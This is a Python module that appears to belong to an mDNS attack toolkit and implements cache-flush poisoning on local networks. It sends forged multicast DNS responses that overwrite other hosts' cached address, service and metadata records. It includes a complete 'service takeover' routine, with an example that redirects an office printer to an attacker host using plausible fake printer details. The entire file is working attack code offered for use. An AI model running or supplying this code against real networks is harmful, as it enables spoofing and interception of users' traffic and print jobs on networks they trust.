"""
flush.py - Cache-flush bit attack (single-packet record takeover).

Sends a response with the cache-flush bit set, which causes all hosts on the
network to flush their cached records of that name/type and replace them with
the attacker's data. This is the most powerful single-packet attack in mDNS.

RFC 6762 Section 10.2: "This is an assertion that this information is the
truth and the whole truth."
"""

import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, DNSPacket, QR_RESPONSE,
                       encode_name, rdata_a, rdata_aaaa, rdata_srv, rdata_txt, rdata_ptr,
                       A, AAAA, PTR, SRV, TXT, CACHE_FLUSH, IN)


def flush_and_replace_a(name: str, new_ip: str, iface: str | None = None,
                        ttl: int = 4500):
    """Flush all A records for a name and replace with attacker's IP."""
    sock = make_mdns_socket(iface)
    pkt = DNSPacket(flags=QR_RESPONSE)
    pkt.add_answer(name, A, rdata_a(new_ip), ttl=ttl, rclass=CACHE_FLUSH)
    send_mdns(sock, pkt.build())
    print(f"[+] Cache-flush sent: {name} A -> {new_ip} (TTL={ttl})")
    print(f"    All hosts will drop cached A records for {name} older than 1s")
    sock.close()


def flush_and_replace_srv(service_name: str, new_host: str, new_port: int,
                          iface: str | None = None, ttl: int = 4500):
    """Flush SRV record for a service and redirect to attacker."""
    sock = make_mdns_socket(iface)
    pkt = DNSPacket(flags=QR_RESPONSE)
    pkt.add_answer(service_name, SRV,
                   rdata_srv(0, 0, new_port, new_host),
                   ttl=ttl, rclass=CACHE_FLUSH)
    send_mdns(sock, pkt.build())
    print(f"[+] Cache-flush sent: {service_name} SRV -> {new_host}:{new_port}")
    sock.close()


def full_service_takeover(service_fqdn: str, new_host: str, new_ip: str,
                          new_port: int, txt: dict[str, str] | None = None,
                          iface: str | None = None, ttl: int = 4500):
    """
    Complete service takeover: flush and replace SRV + TXT + A in one packet.

    Example:
        full_service_takeover(
            "Office Printer._ipp._tcp.local.",
            "evil.local.", "192.168.1.99", 631,
            txt={"ty": "HP LaserJet", "pdl": "application/postscript"}
        )
    """
    sock = make_mdns_socket(iface)
    pkt = DNSPacket(flags=QR_RESPONSE)

    # SRV: redirect service to our host
    pkt.add_answer(service_fqdn, SRV,
                   rdata_srv(0, 0, new_port, new_host),
                   ttl=ttl, rclass=CACHE_FLUSH)
    # TXT: provide plausible metadata
    pkt.add_answer(service_fqdn, TXT,
                   rdata_txt(txt or {}),
                   ttl=ttl, rclass=CACHE_FLUSH)
    # A: resolve our hostname to our IP
    pkt.add_additional(new_host, A, rdata_a(new_ip),
                       ttl=ttl, rclass=CACHE_FLUSH)

    send_mdns(sock, pkt.build())
    print(f"[+] Full service takeover sent:")
    print(f"    {service_fqdn}")
    print(f"      SRV -> {new_host}:{new_port}")
    print(f"      A   -> {new_ip}")
    if txt:
        print(f"      TXT -> {txt}")
    sock.close()


def run(name: str, ip: str, iface: str | None = None, ttl: int = 4500,
        service_name: str | None = None, port: int | None = None,
        txt: str | None = None):
    """Main entry point."""
    if service_name and port:
        txt_dict = {}
        if txt:
            for item in txt.split(","):
                if "=" in item:
                    k, v = item.split("=", 1)
                    txt_dict[k.strip()] = v.strip()
        full_service_takeover(service_name, name, ip, port, txt_dict, iface, ttl)
    else:
        flush_and_replace_a(name, ip, iface, ttl)
